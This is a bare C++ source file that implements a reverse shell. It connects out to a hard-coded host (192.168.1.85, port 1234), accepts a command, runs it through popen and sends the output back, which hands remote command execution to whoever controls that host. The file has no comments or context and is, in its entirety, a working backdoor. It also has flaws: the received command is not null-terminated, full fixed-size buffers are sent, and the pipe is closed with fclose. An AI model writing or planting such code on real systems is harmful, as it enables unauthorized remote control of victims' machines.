#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

int main()
{
    int server=socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in address;
    address.sin_family=AF_INET;
    address.sin_port=htons(1234);
    string ip="192.168.1.85";
    inet_pton(AF_INET,ip.c_str(),&address.sin_addr);
    int r= connect(server,(struct sockaddr*)&address,sizeof(address));
    if(r==0)
    {
        char buffer[4096];
        recv(server,buffer,4096,0);
        FILE* p=popen(buffer,"r");
        char result[4096];
        while(fgets(buffer,sizeof(buffer),p)!=nullptr)
        {
            send(server,buffer,sizeof(buffer),0);
        }
        fclose(p);
    }
    close(server);
}